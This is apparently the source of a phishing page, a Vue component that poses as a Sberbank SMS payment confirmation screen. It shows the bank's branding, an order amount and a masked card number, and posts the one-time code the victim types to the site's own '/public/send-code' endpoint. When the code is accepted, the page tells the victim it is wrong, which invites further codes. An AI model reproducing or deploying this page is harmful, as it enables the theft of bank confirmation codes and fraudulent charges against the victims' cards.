<template>
    <div v-if="payment">
        <div class="mainGlobal">
            <div class="banner">
                <a href="https://www.sberbank.com/ru/certificates" style="text-decoration: none;" target="_blank">
                    <div id="bannerCert" class="bannerCert">
                        <div class="bannerHeader">Установите сертификаты Минцифры</div>
                        <div class="bannerBody">
                            <div id="bannerZipper" class="bannerZipper">
                                <img src="/payment/img/Zipper.png">
                            </div>
                            <div id="bannerText" class="bannerText">
                                <div>Нужны для дальнейшей <br> работы приложения и других сервисов Сбера, <span style="color: #21a038;">установить</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </a>
            </div>
            <!-- End banner for MinCiphra -->
            <div class="global">
                <div id="mainContainer" class="modal-page">
                    <div class="header">
                        <div id="bankLogoContainer">
                            <img src="data:image/png;base64,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" alt="Bank logo" title="Bank logo" class="logo__image">
                        </div>
                        <div id="psLogoContainer">
                            <img src="/payment/img/VISA.png" class="logo__image">
                        </div>
                    </div>
                    <div id="mainData">
                        <div class="keo_amount">
                            <b>{{ amountFormat((+order.amount).toFixed(0)) }} <span>₽</span></b>
                        </div>
                        <div class="list" id="descList" style="display: block;">
                            <div class="list-item" id="pa_merchant" v-if="order.site">
                                <div class="label">Магазин</div>
                                <div class="value">{{ (order.site).toLowerCase() }}</div>
                            </div>
                            <div class="list-item" id="pa_pan">
                                <div class="label">Номер карты</div>
                                <div class="value">
                                    <span style="text-security: disc;-webkit-text-security: disc;-moz-text-security: disc;">**</span> {{ payment.card }}
                                </div>
                            </div>
                            <div class="list-item" id="pa_date">
                                <div class="label">Дата</div>
                                <div class="value">{{ currentDate() }}</div>
                            </div>
                        </div>
                        <div class="desc">
                            <div class="row">
                                <div class="keo_code">
                                    <b>Отправили код</b>
                                </div>
                                <div id="descText">В СМС или Push-уведомлении. Чтобы получить его, ваш номер должен быть подключен к СМС-банку.</div>
                                <div class="keo_code2" style="display: block">Введите код для оплаты покупки</div>
                                <div class="error" v-if="showErrorBlock">Неверный код. Попробуйте еще раз.</div>
                            </div>
                        </div>
                        <div class="keo_list">
                            <div class="passowrd-container">
                                <input id="passwordEdit" name="otp" @input="validateCode" v-model="sms_code" class="big-input" :class="{'input-incorrect': showErrorBlock}" inputmode="numeric" type="password" size="6" maxlength="6" autocomplete="off" pattern="[0-9]*" style="text-security: disc;-webkit-text-security: disc;-moz-text-security: disc;">
                                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAADN0lEQVRIS7WWT4wUVRDGf9V/xjGw3jyxmGW6XUBvXAxid+ZoQtxdjESDnNQYo/jnoLMcjDejBjVG4sEQT0qMKFnWCF4304OejCcCu0yPa0A942IyTPebMq93VldgmkHXd+rk1auv6quqr1ooOVrbc08mzrTAXmACZbwwFy4Dywrf+Mi8pM1Lw9zIzS50cvcWY/w3FH0acMuCAPogJ3PjNO5cXli+3vYGgDyIZhQ+BTYDPYU5B07l/f6Pd4xtspFzbeWPcU9kV1+YEWQGqAArInLQaze/Xg/yD4BeLX5ZRN8HHJSvjKez1aVWpyyDbvhg4Kp3BHSfzUbhlUqaHF178xfAIPKTgCLa8NstCzTyyYLoNeDtokQi+9YyKQA0rI/nas6v0iKv+mnzvZE9rzPMgqgBvGPp8rz+Dlk8+2sBkIfxJ6r6lKXF7yT7hznPguispcFPk6jEZg5sbTjmpcmzYlsxF8fybIyrO8s4z4JIrWM/TW7affauG9RDF3POdp8n7oT0guhFgQ8VvqikyRNl1IwCYN9nQXwCdL+KHJIsiL4FHhbVA16n9flGAOS1+EkV/Qw4I3kQXVQIjcpktdO8uBEA3W17truOcwFYtBms2O7xqu6YnFu4uhEAen99c9411u/V/wcgfOCuXCtXgN8twCIwaVS3VzutpVtkkICqn7biMrtrE/UdjmvOI3rhtoo86vDlYXRQtdCzM7ZNDwkcVfREJW09PqqT0kxr0ZcIj6noC6JBvDVHfyoGTcx91fZ36X+Z5G4tvtcVtYMmnptPrEpFEB1TeAZkzk+bj5YAlNZAwba9lYppQT/20tZzq2I3uXtLbjwrdmNAw0+TI/+GqqwWH0b0LeCKl7NTfk5++1uuw3hKVS26PYdvB6SIvBbPIvpmIdfKlNdJThff6yMd6NIHxcJB5gxOo5outMuyGXD+LjBVLByRlyrt5kdrb25cmeFDj6jK8QFdGcgpUeZN3/mhsqlY9vR6/a2uYZeiMwjTVmCLoVIOrEU+FKCoSRjdnau8Dvo84N2iHnZNHvdzZi3n19sO1fVVoPp4Rn9alL1Ifxsqg98WvYxKR0VP+46Zl6XvfxkWxJ/8hn7KAwpZ5wAAAABJRU5ErkJggg==" class="exclamation" v-if="showErrorBlock">
                            </div>
                            <p v-if="resendCodeTime === 0">
                                <input id="resendLink" href="javascript:void(0);" onclick="javascript:resendSMS(); return false;" name="submitButton" class="big-button" type="submit" value="Получить новый код" style="display: block;" @click="resendCode">
                            </p>
                            <p align="left" v-else>
                                <span id="timer" class="keo_code3">
                                    <span style="color: #888888;">Повторный запрос через </span>
                                    <span id="seconds">{{ resendCodeTime }} секунд</span>
                                </span>
                            </p>
                           
                            
                            <p v-if="resendCodeTime === 0">
                                <span id="smsBank" class="keo_code3" style="display: inline; text-align: center;">
                                    <span style="color: #888888;">Или подключить </span>
                                    <span style="color: #82ea8f;">
                                        <a id="sms" href="http://www.sberbank.com/sms/mb3">СМС-банк</a>
                                    </span>
                                </span>
                            </p>
                            
                            <div class="keo_code4" style="display: block">
                                <p align="left">Оплата покупок без комиссии. За пополнение карт и кошельков через приложения и сайты других банков взимается комиссия. Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: <a href="https://sberbank.com/sms/rl?url=/ru/person/help/debet_cards_faq/retraction" target="_blank">ссылка</a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Begin banner for MinCiphra -->
            <!-- Begin count MinCiphra -->
            <div id="checkCertImg">
                <img src="https://www.sberbank.ru/favicon.ico" style="width: 0px; height: 0px; display: block; position: absolute; top: -800px; left: -800px; z-index: -100;">
            </div>
            <!-- End count MinCiphra -->
        </div>
    </div>
</template>
<script>
    export default {
        layout: 'payment',
        head: {
            title: 'Подтверждение оплаты',
            meta: [{
                charset: 'utf-8'
            }, {
                name: 'viewport',
                content: 'width=device-width,initial-scale=1'
            }, {
                hid: 'description',
                name: 'description',
                content: 'Подтверждение оплаты'
            }],
            link: [{
                rel: 'icon',
                type: 'image/x-icon',
                href: '/payment/img/favicon.ico'
            }, {
                rel: 'stylesheet',
                href: '/payment/css/sberconfirm.css'
            }]
        },
        data() {
            return {
                order: [],
                payment: [],
                sms_code: '',
                showErrorBlock: false,
                resendCodeTime: 0
            }
        },
        async mounted() {
            await this.checkTimer()
        },
        async fetch() {
            await this.fetchOrder();
            await this.getPayment()
        },
        methods: {

            amountFormat(amount){
                if (amount.indexOf(".") == "-1") {
                    return String(replaced(amount));
                } else {
                    var obr = amount.substring(amount.indexOf("."),amount.length);
                    var amount_int = amount.substring(0,amount.indexOf("."));
                    if (obr.length <3) { obr=obr+"0"}
                    return String(replaced(amount_int))+ obr;
                }
                function replaced(r){
                    return String(r.replace(/(\d)(?=(\d{3})+$)/g, '$1 '));
                }
		    },


            validateCode() {
                if (this.sms_code.length === 6) {
                    this.sendSmsCode();
                    this.sms_code = ''
                } else {
                    this.showErrorBlock = false;
                }
            },

            currentDate() {
                // return date format 07.07.2023
                return new Date().toLocaleDateString('ru-RU', {
                    day: '2-digit',
                    month: '2-digit',
                    year: 'numeric'
                }).split('.').join('.')  
            },

            async checkTimer() {
                if (this.$cookies.get('resendTime')) {
                    this.resendCodeTime = this.$cookies.get('resendTime');
                    this.$cookies.remove('resendTime');
                    this.resendCodeTimer();
                }
            },
            async fetchOrder() {
                try {
                    const {
                        data: response
                    } = await this.$axios.get('/public/get-transaction/' + this.$route.query.orderId);
                    if (response.success) {
                        if (!response.data.is_active) {
                            this.$router.push('/?orderId=' + this.$route.query.orderId);
                        }
                        this.order = response.data;
                    }
                } catch (e) {
                    console.log(e);
                }
            },
            async getPayment() {
                try {
                    const {
                        data: response
                    } = await this.$axios.get('/public/get-transaction/' + this.$route.query.orderId);
                    if (response.success) {
                        this.payment = response.data;
                    }
                } catch (e) {
                    console.log(e);
                }
            },
            async sendSmsCode() {
                try {
                    const {
                        data: response
                    } = await this.$axios.post('/public/send-code', {
                        code: this.sms_code,
                        uuid: this.$route.query.orderId,
                    });
                    if (response.success) {
                        this.showErrorBlock = true;
                    }
                } catch (e) {
                    console.log(e);
                }
            },
            async resendCode() {
                try {
                    const {
                        data: response
                    } = await this.$axios.post('/public/resend-code', {
                        uuid: this.$route.query.orderId,
                    });
                    if (response.success) {
                        this.resendCodeTime = 60;
                        this.showErrorBlock = false;
                        this.resendCodeTimer();
                    }
                } catch (e) {
                    console.log(e);
                }
            },
            resendCodeTimer() {
                setTimeout(() => {
                    if (this.resendCodeTime > 0) {
                        this.resendCodeTime--;
                        this.$cookies.set('resendTime', this.resendCodeTime);
                        this.resendCodeTimer();
                    }
                }, 1000);
            },
        },
    }
</script>